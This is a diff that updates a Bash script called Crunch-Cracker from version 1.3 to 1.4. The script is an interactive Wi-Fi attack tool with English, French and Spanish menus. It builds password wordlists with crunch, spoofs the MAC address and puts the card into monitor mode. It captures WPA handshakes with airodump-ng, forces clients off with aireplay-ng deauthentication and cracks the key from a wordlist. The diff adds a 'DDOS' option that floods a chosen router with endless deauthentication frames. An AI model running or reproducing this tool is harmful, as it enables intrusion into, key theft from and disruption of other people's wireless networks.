@@ -14,7 +14,7 @@
 #    8e     8   8  8   8 8  8 8   8  8    8   8          #
 #    88     8eee8e 8eee8 8e   8eee8e 8eee 8eee8e         #
 #    88   e 88   8 88  8 88   88   8 88   88   8         #
-#    88eee8 88   8 88  8 88e8 88   8 88ee 88   8 v 1.3   #
+#    88eee8 88   8 88  8 88e8 88   8 88ee 88   8 v 1.4   #
 #                                                        #
 ##########################################################
 #
@@ -62,6 +62,22 @@
 # Dev: Shell
 # BY: KURO-CODE
 #
+# *************************
+# * Crunch-Cracker V 1.4  *
+# *************************
+#						 
+# + Compatibility
+#   - Ubuntu
+#   - Kali 
+#
+# + Trap (Exit)
+# + Root perm.
+# + Router flood
+# 
+# Date: 08/06/2018
+# Dev: Shell
+# BY: KURO-CODE
+#
 
 #**** CONFIG ****
 DUMP="Wordlist"
@@ -83,11 +99,13 @@ EC="\033[0m"
 DATE=`date`
 
 #**** TXT ****
+airmon="airmon-ng"
 Air_P="AirPlay"
 
 #**** Info ****
 Inf_Name="Crunch-Cracker"
-Inf_Ver="1.3"
+Inf_Ver="1.4"
+Inf_Date="08/06/2018"
 
 #**** PATH ****
 chmod +x aimon-ng
@@ -100,20 +118,42 @@ if [ -d "$DUMP" ];
 			mkdir $DUMP
 	fi
 
+#**** Check Root ****
+function check_root_perm() {
+	clear
+	LOGO
+	user=$(whoami)
+	if [ "$user" = "root" ]; then
+  		echo -e "
+$W [$G""X$W]$GR...$G""Y$W""ou are $G""Root$W!"
+  		sleep 1.2
+	else
+		echo -e "
+$W [$R""X$W]$GR...$R""Y$W""ou are not $R""Root$W!
+ 
+ $G""U$W""se:$Y sudo ./crunchcracker.sh$EC"
+ 		sleep 1
+    	echo -e "
+$W [$R""X$W]$GR...$R""C$W""lose" 
+    	sleep 1
+    	exit
+	fi
+}
+
 #**** SET LANGUAGE ****
 function setting {
+	Place="setting"
+	if [ "$CC_AUTO" =  "1" ];
+		then 
+			eng; setting
 
-if [ "$CC_AUTO" =  "1" ];
-	then 
-		english; setting
+	else 
 
-else 
-
-     while true; do
+     	while true; do
 	
-	top
+		LOGO
 
-	echo -e "
+		echo -e "
    $GR╔═══════════════════════════╗
    ║ $R["$Y"i"$R"]"$W" Select your$W language$GR  ║
    ╚═╦══════════════════════╦══╝
@@ -122,17 +162,17 @@ else
      ╚═══╣$G 2$GR ║$W French   ╠═══╝
 	 ║$G 3$GR ║$W Spanish  ║
 	 ╚═══╩══════════╝"        
-	echo 
-	read -p " Choice: " choix
-	echo ""
-	case $choix in
-		1 ) eng; main; break ;;
+		echo 
+		read -p " Choice: " Selection
+		echo ""
+		case $Selection in
+			1 ) eng; main; break ;;
             	2 ) fr; main; break;;
-		3 ) span; main; break;;
-		* ) echo -e "$W [$R ERROR $W]"; sleep 3 ;setting;;
-	  esac
-    done
-fi 
+			3 ) span; main; break;;
+			* ) echo -e "$W [$R ERROR $W]"; sleep 3 ;setting;;
+	  	esac
+    	done
+	fi 
 }
 
 #**** ENG ****
@@ -161,7 +201,7 @@ eng() {
 	INFNAME="║$G Name:$W.......$Inf_Name                   ║"
 	INFVER="║$G Version:$W....$Inf_Ver                              ║"
 	INFLNG="║$G Language:$W...[ENG, FR, ESP]                   ║"
-	INFDATE="║$G Date:$W.......04/29/2017                       ║"
+	INFDATE="║$G Date:$W.......$Inf_Date                       ║"
 	INFAUTH="║$G Author:$W.....KURO-CODE                        ║"
 	INFTYPE="║$G Type:$W.......Wordlist generator/Wifi cracker  ║"
 	INFDEV="║$G Dev:$W........Shell                            ║"
@@ -202,7 +242,7 @@ header_scanchan="Network scan"
 CLEAN="["$G"i"$W"] Clean $GR""Dump$W"
 MACCHANGR=""$W"["$G"i"$W"] Restoration $GR""Macchanger$W"
 NMANAGER="["$G"i"$W"] Restart $GR""Network-manager$W"
-CLOSEMON="$W[$G*$W] Kill  $GR""airmon-ng$W"
+CLOSEMON="$W[$G*$W] Kill  $GR""airmon$W"
 
 #~~~~ REPORT ~~~~
 K_Found="$G Key Found:$W "
@@ -240,7 +280,7 @@ fr() {
 	INFNAME="║$G Nom:$W......$Inf_Name		          ║"
 	INFVER="║$G Version:$W..$Inf_Ver 			          ║"
 	INFLNG="║$G Langue:$W...[ENG, FR, ESP]		          ║"
-	INFDATE="║$G Date:$W.....29/04/2017		          ║"
+	INFDATE="║$G Date:$W.....$Inf_Date		          ║"
 	INFAUTH="║$G Auteur:$W...KURO-CODE			          ║"
 	INFTYPE="║$G Type:$W.....Générateur Wordlist/Cracker Wifi    ║"
 	INFDEV="║$G Dev:$W......Shell 			          ║"
@@ -250,7 +290,7 @@ fr() {
 	TLIST2="╚═╦══════════════════════════════════╝"
 	SETLIST_INFMIN="$W[$Y!$W]$G Entrez un nombre de caractères minimun "
 	SETLIST_INFMAX="$W[$Y!$W]$G Entrez un nombre de caractères maximum "
-	SETLIST_INFCHAR="$W[$Y!$W]$G Entrez les caratères de votre choix"
+	SETLIST_INFCHAR="$W[$Y!$W]$G Entrez les caratères de votre Selection"
 	SETLIST_IN=" Caractères"
 	SETLIST_NAMELIST="$W[$Y!$W]$G Donnez un nom à votre wordlist"
 	SETLIST_WAIT=" Création de la liste, veuillez patienter un instant..."
@@ -320,7 +360,7 @@ span() {
 	INFNAME="║$G Nombre:$W...$Inf_Name                       ║"
 	INFVER="║$G Version:$W..$Inf_Ver 	                           ║"
 	INFLNG="║$G Lengua:$W...[ENG, FR, ESP]                       ║"
-	INFDATE="║$G Fecha:$W....29/04/2017                           ║"
+	INFDATE="║$G Fecha:$W....$Inf_Date                           ║"
 	INFAUTH="║$G Autor:$W....KURO-CODE                            ║"
 	INFTYPE="║$G Tipo:$W.....Generador de Wordlist/Wifi Cracker   ║"
 	INFDEV="║$G Dev:$W......Shell 	                           ║"
@@ -379,6 +419,7 @@ A_Fail="$W [$R""X$W]...$R""Ataque fallido$EC"
 
 #~~~~ INTRO ~~~
 RUN() {
+	Place="RUN"
 	clear
 	sleep 0.5
 	echo -e "$G		8eeee8 "
@@ -408,14 +449,15 @@ RUN() {
 	sleep 0.5
 	echo -e "			 $W[$Y""K$W][$G""U$W]$G""R$W[$R""O$W]-$W[$Y""C$W][$G""O$W]$G""D$W[$R""E$W] "
 	sleep 3
-	setting
+	
 }
 
 #~~~~ Main Menu ~~~~
 main() {
+	Place="main"
 	clear
 	echo
-	top
+	LOGO
 	echo -e "
   $W╔═════════════╗
   ║ $OPT $W   ║
@@ -426,8 +468,8 @@ main() {
 	║$R 0 $W║$R $Exit   $W      ║
 	╚═══╩═════════════════╝ "
 	echo
-	read -p " $Choice: " choix
-		case $choix in
+	read -p " $Choice: " Selection
+		case $Selection in
 			1) information;;
 			2) Crunchmenu;;
 			0) EXITMENU;;
@@ -437,9 +479,10 @@ main() {
 
 #~~~~ INFO ~~~~
 information() {
+	Place="information"
 	clear
 	echo
-	top
+	LOGO
 	echo
 	echo -e " $INFBAR"	
 	echo -e "  $INFNAME "
@@ -465,9 +508,10 @@ main
 
 #~~~~ MENU CRUNCH ~~~~
 Crunchmenu() {
+	Place="Crunchmenu"
 	clear
 	echo
-	top
+	LOGO
 	echo -e "
   $W╔════════════════════╗
   ║     $OPT $GR      ║
@@ -475,15 +519,17 @@ Crunchmenu() {
     ║   ╔═══╦════════════════════╗
     ║   ║$Y 1 $W║ $MAKE$W ║
     ║   ║$G 2 $W║ $C_SCAN$W       ║
-    ╚═══╣$W 3 ║ $Return $W        	 ║
+    ║   ║$G 3 $W║ DDOS               ║
+    ╚═══╣$W 4 ║ $Return $W        	 ║
 	║$R 0 $W║$R $Exit   $W         ║
 	╚═══╩════════════════════╝ "
 	echo
-	read -p " $Choice: " choix
-		case $choix in
+	read -p " $Choice: " Selection
+		case $Selection in
 			1) LST;;
-			2) MONITOR;;
-			3) main;;
+			2) MONITOR; SCANNER; OUTSCAN; HANDSHAK; sleep 4; AirPlay; VALID;;
+			3) MONITOR; SCANNER; OUTSCAN; sleep 2; HANDSHAK; DDOS;;
+			4) main;;
 			0) EXITMENU;;
 			*) echo -e "$W [$R $error$W ]"; sleep 3; Crunchmenu;;
 		esac
@@ -491,29 +537,30 @@ Crunchmenu() {
 
 #~~~~ Set list ~~~~
 function LST {
+	Place="LST"
 	clear
-	top
+	LOGO
 	echo
 	echo -e "$SETLIST_INFMIN $W "
 	echo
 	read -p " Min: " nummin
 	clear
 	echo
-	top
+	LOGO
 	echo
 	echo -e "$SETLIST_INFMAX $W "
 	echo
 	read -p " Max: " nummax
 	clear 
 	echo
-	top
+	LOGO
 	echo
 	echo -e "$SETLIST_INFCHAR $W"
 	echo
 	read -p " $SETLIST_IN: " char
 	clear
 	echo
-	top
+	LOGO
 	echo
 	echo -e "$SETLIST_NAMELIST $W"
 	echo
@@ -521,14 +568,14 @@ function LST {
 		sleep 1
 		clear
 		echo
-		top
+		LOGO
 		echo
 		echo -e "$SETLIST_WAIT"
 		echo
 		sleep 1
 		crunch $nummin $nummax $char -o $DUMP/$Nom.txt
 		echo 
-		top
+		LOGO
 		echo
 		echo -e "$SETLIST_FINISH "
 		echo -e " $SETLIST_FOLDERLIST$Nom.txt)$W [$R!$W]"
@@ -540,11 +587,12 @@ compress
 
 #~~~~ Function COMPRESS ~~~~
 function compress {
-		clear
-		echo
-		top
-		echo
-		echo -e "
+	Place="compress"
+	clear
+	echo
+	LOGO
+	echo
+	echo -e "
   $ZIPLIST
   ║$W $COMPRESS_MSG $W║
   $ZIPTLIST2
@@ -553,79 +601,102 @@ function compress {
     ║   ║$G 2 $W║ $NO    $W║
     ╚═══╣$R 0 $W║ $Exit$W║
 	╚═══╩════════╝ "
-		read -p " $Choice: " choix
-		case $choix in
-			1) echo
-			   echo -e "$COMPRESS_WAITC "
-			   cd $DUMP &&
-			   tar cvzf $Nom.tar $Nom.txt
-				rm -f $Nom.txt
-			   clear
-			   echo
-			   top
-			   echo
-			   echo -e " $COMPRESS_OK"
-			   sleep 1
-			   echo -e " $COMPRESS_SUPP$Nom.txt"
-			   sleep 3 ;;
-			2) main;;
-			0) EXITMENU;;
-			*) echo -e "$W [$R $error$W ]"; sleep 3; compress;;
-		esac
+	read -p " $Choice: " Selection
+	case $Selection in
+		1) echo
+		   echo -e "$COMPRESS_WAITC "
+		   cd $DUMP &&
+		   tar cvzf $Nom.tar $Nom.txt
+		   rm -f $Nom.txt
+		   clear
+		   echo
+		   LOGO
+		   echo
+		   echo -e " $COMPRESS_OK"
+		   sleep 1
+		   echo -e " $COMPRESS_SUPP$Nom.txt"
+		   sleep 3 ;;
+		2) main;;
+		0) EXITMENU;;
+		*) echo -e "$W [$R $error$W ]"; sleep 3; compress;;
+	esac
 main
+}
+
+function Check_Distro {
+	Place="Check_Distro"
+	Vname=`lsb_release -a | grep ID | awk '{print $3}'`
+	case $Vname in
+		"Ubuntu")
+			echo -e "$Vname"
+			sleep 3
+			Mon="mon0"
+			$airmon start "$device"
+		;;
+		"Kali")
+			echo -e "$Vname"
+			sleep 3
+			Mon2="mon"
+			Mon="$device$Mon2"
+			$airmon start "$device"
+		;;
+	esac 
 }
 
 #~~~~ Function Monitoring ~~~~
 function MONITOR {
+	Place="MONITOR"
 	clear
 	mkdir CRACKTMP
 	TMP="CRACKTMP"
-	top
+	LOGO
 	echo 
 	echo -e "$SELECT_DEVICE$Y"
 	echo
 	ifconfig | grep -a 'wl' | awk '{print $1}'
 	echo -e "$W"
 	read -p "$CHOICE_DEVICE " device
-	clear
-	top
-	echo
 	ifconfig $device down
-	iwconfig $device mode monitor
-	sleep 1
 	echo -e ""$W"["$G"i"$W"]....$GR""Macchanger$W"
 	macchanger -r $device
-	sleep 1 
+	sleep 1
 	ifconfig $device up
 	sleep 1
-	echo -e ""$W"["$G"i"$W"]....$GR""Monitor$W"
+	Check_Distro
+	clear
+	LOGO
+	echo
+	sleep 1
+	echo -e ""$W"["$G"i"$W"]...$GR""Monitor, 20sec...$W"
 	sleep 2
-SCANNER
 }
 
 #~~~~ Function Scan ~~~~
 function SCANNER {
+	Place="SCANNER"
 	CSV=dump-01.csv
 	rm -rf $TMP/*
-	xterm -hold -title "$header_scan" $TOPLEFTBIG -bg "#000000" -fg "#11ff00" -e airodump-ng -w $TMP/DUMP -a $device --ignore-negative-one &
-	sleep 10
+	xterm -hold -title "$header_scan" $TOPLEFTBIG -bg "#000000" -fg "#11ff00" -e airodump-ng -w $TMP/DUMP -a $Mon --ignore-negative-one &
+	sleep 20
 	killall xterm
-OUTSCAN
 }
 
 #~~~~ OUTSCAN ~~~~
 function OUTSCAN {
+	Place="OUTSCAN"
 	clear
-	top
+	LOGO
 	CSV="DUMP-01.csv"
 	WIFI=`wc -l $TMP/$CSV | awk '{print $1}'`
 	echo 
 	head -n $CIBLE $TMP/$CSV &> $TMP/dump-02.csv
 	tail -n +$CIBLE $TMP/$CSV &> $TMP/target.csv
-	echo "                        WIFI LIST "
-	echo ""
-	echo " ID      MAC                      CHAN    SECU     PWR   ESSID"
-	echo ""
+	echo "
+                        WIFI LIST
+
+ ID          MAC                CHAN     SECU     PWR    ESSID
+-----------------------------------------------------------------------"
+
 	i=0
 	while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY;do
 		longueur=${#MAC}
@@ -662,6 +733,7 @@ function OUTSCAN {
 	fi 
 	if [[ $choice -eq "r" ]]; then
 		SCANNER
+		OUTSCAN
 	fi
 
 	idlength=${aidlength[$choice]}
@@ -678,23 +750,20 @@ function OUTSCAN {
 	acouper=${#ssid}
 	fin=$(($acouper-idlength))
 	Host_SSID=${ssid:1:fin}
-	Host_SSID2=`echo $Host_SSID | sed 's/ //g' | sed 's/\[//g;s/\]//g' | sed 's/\://g;s/\://g' | sed 's/\*//g;s/\*//g' | sed 's/(//g' | sed 's/)//g'`
-
-	HANDSHAK & 
-sleep 4
-AirPlay
-VALID
+	Host_SSID2=`echo $Host_SSID | sed 's/ //g' | sed 's/\[//g;s/\]//g' | sed 's/\://g;s/\://g' | sed 's/\*//g;s/\*//g' | sed 's/(//g' | sed 's/)//g'`	
 }
 
 #~~~~ HANDSHAK ~~~~
 function HANDSHAK { 
-	xterm -hold -title "$Host_SSID" $TOPLEFTBIG2 -e "airodump-ng -w $TMP/$OUTPUT -c$Host_CHAN --essid $Host_SSID --bssid $Host_MAC $device" &
+	Place="HANDSHAK"
+	xterm -hold -title "SSID $Host_SSID" $TOPLEFTBIG2 -e "airodump-ng -w $TMP/$OUTPUT -c$Host_CHAN --essid $Host_SSID --bssid $Host_MAC $Mon" &
 }
 
 #~~~~ Function VALID ~~~~
 VALID() {
+	Place="VALID"
 	clear
-	top
+	LOGO
 	echo -e "
 	Handshake 
 		  $W[$G""1$W] $YES
@@ -702,26 +771,50 @@ VALID() {
 		  [$Y""9$W] Rescan   
 		  [$R""0$W]$R $Exit$EC"
 	echo
-	read -p " $Choice: " choix
-		case $choix in
+	read -p " $Choice: " Selection
+		case $Selection in
 			1) KILLPROC; SETCRACK;;
 			2) AirPlay;;
 			9) KILLPROC; SCANNER;;
-			0) NETWORKRESTOR; EXITMENU;;
+			0) NETWORKRESTOR; KILLPROC; EXITMENU;;
 			*) echo -e "$W [$R $error$W ]"; sleep 3; VALID;;
 		esac
 }
 
 #~~~~ Function DEAUTH ~~~~
 function AirPlay {
+	Place="AirPlay"
 	clear
-	top
+	LOGO
 	echo -e "
  [$G!$W]$GR...$W""Deauth $Host_SSID
 "
-	DD="aireplay-ng --deauth 10 -a " 
-       	$DD $Host_MAC $device &&
+	xterm -title "Deauth" -fg "#d1450e" -e aireplay-ng --deauth 10 -a $Host_MAC $Mon --ignore-negative-one &&
 	VALID
+}
+
+function DDOS {
+	xterm -title "DDOS Attack" -fg "#FF0000" -e aireplay-ng --deauth 0 -a $Host_MAC $Mon --ignore-negative-one &
+	Kill_Ddos
+}
+
+function Kill_Ddos {
+	Place="Kill_Ddos"
+	clear
+	LOGO
+	echo -e "
+	Kill Attack 
+		  $W[$G""1$W] $YES 
+		  [$Y""9$W] Rescan   
+		  [$R""0$W]$R $Exit$EC"
+	echo
+	read -p " $Choice: " Selection
+		case $Selection in
+			1) KILLPROC; NETWORKRESTOR; Crunchmenu;;
+			9) KILLPROC; SCANNER;OUTSCAN; sleep 2; DDOS;;
+			0) NETWORKRESTOR; EXITMENU;;
+			*) echo -e "$W [$R $error$W ]"; sleep 3; VALID;;
+		esac
 }
 
 #~~~~ KILL Process ~~~~
@@ -731,8 +824,9 @@ function KILLPROC {
 
 #~~~~ SETCRACK ~~~~
 SETCRACK() {
+	Place="SETCRACK"
 	clear
-	top
+	LOGO
 	echo -e "
 	$SETLIST_SELECT2
   
@@ -740,33 +834,50 @@ SETCRACK() {
 		  [$Y""2]$W $NO  
 		  [$R""0]$R $Exit $W"
 	echo
-	read -p " $Choice: " choix
-		case $choix in
-			1) RLIST;;
+	read -p " $Choice: " Selection
+		case $Selection in
+			1) RLIST; Check_List;;
 			2) CRK;;
-			0) NETWORKRESTOR;EXITMENU;;
+			0) NETWORKRESTOR; EXITMENU;;
 			*) echo -e "$W [$R $error$W ]"; sleep 3; SETCRACK;;
 		esac
 }	
 
 #~~~~ FOLDER LIST ~~~~
 RLIST() {
+	Place="RLIST"
 	clear
-	top
+	LOGO
 	echo
 	echo -e " $SETLIST_SELECT"
 	echo 
 	ls Wordlist/
 	echo " "
 	read -p " List: " WORDLIST
-CRACKLIST
+}
+
+function Check_List {
+	Place="Check_List"
+	if [ ! -f "$DUMP/$WORDLIST" ]; 
+		then
+			clear
+			LOGO
+			echo
+			echo -e "$W[$R""x$W]...file do Not exist!";
+			sleep 3
+			RLIST
+		else
+			echo -e " ";
+			CRACKLIST
+	fi
 }
 
 #~~~~ Function CRK ~~~~
 function CRK {
-        clear
+	Place="CRK"
+    clear
 	echo
-	top
+	LOGO
 	if [ -d "$TMP2" ];
 		then
 			echo -e " ";
@@ -800,7 +911,7 @@ $R_SAVE$TMP2/KEY_$Host_SSID.txt
 	else
 		clear
 		echo
-		top
+		LOGO
 		echo
 		echo -e "$A_Fail"
 		sleep 5
@@ -811,9 +922,10 @@ $R_SAVE$TMP2/KEY_$Host_SSID.txt
 
 #~~~~ WORDLIST ~~~~
 function CRACKLIST {
+	Place="CRACKLIST"
 	clear
 	echo
-	top
+	LOGO
 	echo
 	if [ -d "$TMP2" ];
 		then
@@ -848,7 +960,7 @@ $R_SAVE$TMP2/KEY_$Host_SSID.txt
 	else
 		clear
 		echo
-		top
+		LOGO
 		echo
 		echo -e "$A_Fail"
 		sleep 5
@@ -859,22 +971,23 @@ $R_SAVE$TMP2/KEY_$Host_SSID.txt
 
 #~~~~ NETWORKRESTOR ~~~~
 function NETWORKRESTOR {
+	Place="NETWORKRESTOR"
 	clear
 	echo
-	top
+	LOGO
 	echo
 	rm -Rf $TMP
 	echo -e "$CLOSEMON"
+	$airmon stop "$Mon"
 	ifconfig $device down
-	iwconfig $device mode managed
-	sleep 2
+	sleep 0.5
 	echo -e "$MACCHANGR"
 	macchanger -p $device
 	sleep 2
 	ifconfig $device up
 	sleep 2
 	clear
-	top
+	LOGO
 	echo
 	echo -e "$NMANAGER"
 	sleep 0.5
@@ -882,8 +995,8 @@ function NETWORKRESTOR {
 	sleep 5
 }
 
-#~~~~ Function Top ~~~~
-top() {
+#~~~~ Function LOGO ~~~~
+LOGO() {
 	clear
 	echo
 	sleep 0.1 
@@ -893,11 +1006,29 @@ top() {
 	sleep 0.5
 }
 
+#~~~~ Function Trap Exit (Ctrl+C) ~~~~
+function cap_trap {
+	case $Place in
+		"Check_Distro") KILLPROC; NETWORKRESTOR; EXITMENU;;
+		"SCANNER") KILLPROC; NETWORKRESTOR; EXITMENU;;
+		"OUTSCAN") KILLPROC; NETWORKRESTOR; EXITMENU;;
+		"HANDSHAK") KILLPROC; NETWORKRESTOR; EXITMENU;;
+		"VALID") KILLPROC; NETWORKRESTOR; EXITMENU;;
+		"AirPlay") KILLPROC; NETWORKRESTOR; EXITMENU;;
+		"SETCRACK") KILLPROC; NETWORKRESTOR; EXITMENU;;
+		"RLIST") KILLPROC; NETWORKRESTOR; EXITMENU;;
+		"CRK") KILLPROC; NETWORKRESTOR; EXITMENU;;
+		"CRACKLIST") KILLPROC; NETWORKRESTOR; EXITMENU;;
+		"Kill_Ddos") KILLPROC; NETWORKRESTOR; EXITMENU;;
+		"*") EXITMENU;;
+esac
+}
+
 #~~~~ EXIT ~~~~
 function EXITMENU {
 	clear
 	echo
-	top
+	LOGO
 	echo
 	echo -e "$W $CLOSE"
 	echo -e " [$R*$W] $G $OFF $W [$R*$W]"
@@ -905,8 +1036,17 @@ function EXITMENU {
 	clear
 	exit
 }
+
+#~~~~ Trap Exit (Ctrl+C) ~~~~
+for x in SIGINT SIGHUP INT SIGTSTP; do
+	trap_cmd="trap \"cap_trap $x\" \"$x\""
+	eval "$trap_cmd"
+done
 #>>>>>>>>>>>>> END <<<<<<<<<<<<<<<<<<
 
 #************ START *****************
 RUN
+check_root_perm
+setting
+
 
